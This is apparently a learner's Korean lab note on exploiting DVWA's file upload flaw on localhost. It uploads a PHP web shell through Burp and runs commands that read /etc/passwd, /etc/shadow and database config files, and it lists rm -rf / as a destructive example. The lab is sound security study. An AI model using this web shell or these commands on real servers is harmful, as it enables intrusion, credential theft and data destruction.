# Day 7 - DVWA File Upload 실습

## 환경
- DVWA: `http://localhost:8081`
- Security Level: Low
- 메뉴: File Upload

## DVWA 실행
```bash
docker start $(docker ps -aq --filter ancestor=vulnerables/web-dvwa)
```

---

## 전체 흐름

```
1. 이미지 업로드 요청을 Burp로 가로챔
2. 파일 내용을 PHP 코드로 바꿔서 서버에 전송
3. 서버가 PHP 파일을 저장
4. 그 파일 URL로 접속하면 PHP 코드가 실행됨
5. cmd 파라미터로 명령어를 전달해서 서버에서 실행
```

---

## Step 1 - 이미지 업로드 요청 캡처

1. Burp Intercept ON → Open Browser에서 DVWA 접속
2. File Upload 메뉴에서 아무 이미지 업로드
3. 요청 캡처 → Send to Repeater → Forward

---

## Step 2 - Repeater에서 웹쉘로 교체

세 곳 수정:

1. `filename="사진.png"` → `filename="webshell.php"`
2. `Content-Type: image/png` → `Content-Type: application/octet-stream`
3. 이미지 바이너리 데이터 전체 삭제 후 아래 코드로 교체:
   ```php
   <?php echo system($_GET['cmd']); ?>
   ```

Send → 응답 확인:
```
../../hackable/uploads/webshell.php succesfully uploaded!
```

---

## Step 3 - 웹쉘 실행

Burp 브라우저에서 URL로 직접 명령어 전달:

```
http://localhost:8081/hackable/uploads/webshell.php?cmd=명령어
```

### 실행한 명령어들

```
?cmd=whoami
→ www-data  (Apache 실행 계정)

?cmd=ls /
→ bin boot dev etc home lib ... (서버 루트 파일 목록)

?cmd=cat /etc/passwd
→ root:x:0:0:root:/root:/bin/bash
   www-data:x:33:33:...
   mysql:x:101:101:...
   (서버 유저 목록 전체 노출)
```

---

## PHP 코드 분석

```php
<?php echo system($_GET['cmd']); ?>
```

| 부분 | 역할 |
|------|------|
| `$_GET['cmd']` | URL의 `?cmd=whoami` 에서 `whoami` 를 가져옴 |
| `system(...)` | 그 값을 서버에서 리눅스 명령어로 실행 |
| `echo ...` | 실행 결과를 화면에 출력 |

---

## 왜 위험한가 — RCE (Remote Code Execution)

`cmd=` 뒤에 아무 명령어나 실행 가능:

```
?cmd=cat /etc/shadow          → 비밀번호 해시 탈취
?cmd=cat /var/www/html/config.php → DB 비밀번호 탈취
?cmd=ls /var/www/html         → 소스코드 파일 목록
?cmd=rm -rf /                 → 서버 파일 전부 삭제
```

읽기뿐만 아니라 삭제, 수정, 새 파일 생성까지 가능 → 서버 완전 장악

실제 공격 시나리오:
```
webshell.php 업로드
→ DB 설정 파일에서 비밀번호 탈취
→ DB 접속해서 유저 데이터 전부 덤프
→ 랜섬웨어 설치
→ 다른 서버 공격의 발판으로 사용
```

---

## 경로를 어떻게 아나

공격자가 `/etc/passwd` 같은 경로를 미리 아는 이유:

1. **리눅스 표준 경로** — 전 세계 리눅스 서버 구조가 거의 동일
   ```
   /etc/passwd      → 유저 목록
   /etc/shadow      → 비밀번호 해시
   /var/www/html/   → Apache 웹 파일 기본 위치
   /proc/version    → 서버 OS 버전
   ```

2. **에러 메시지에서 힌트** — 오늘 응답에서 경로 노출:
   ```
   ../../hackable/uploads/webshell.php succesfully uploaded!
   → 웹 루트 경로 유추 가능
   ```

3. **스택 트레이스** — Day 5 패턴 8처럼 에러 메시지에서 파일 경로 노출

---

## PortSwigger 랩 vs DVWA 비교

| | PortSwigger 랩 | DVWA |
|--|--------------|------|
| 웹쉘 코드 | `file_get_contents()` — 파일 읽기 | `system($_GET['cmd'])` — 명령어 실행 |
| 결과 | 특정 파일 내용 읽기 | 서버에서 아무 명령어나 실행 가능 |
| 심각도 | 높음 | 매우 높음 (서버 완전 장악) |

---

## 핵심 정리

서버가 업로드 파일을 검증하지 않으면:
```
PHP 파일 업로드 가능
→ 서버가 PHP 코드 실행
→ 공격자가 서버에서 임의 명령어 실행 (RCE)
→ 서버 완전 장악
```
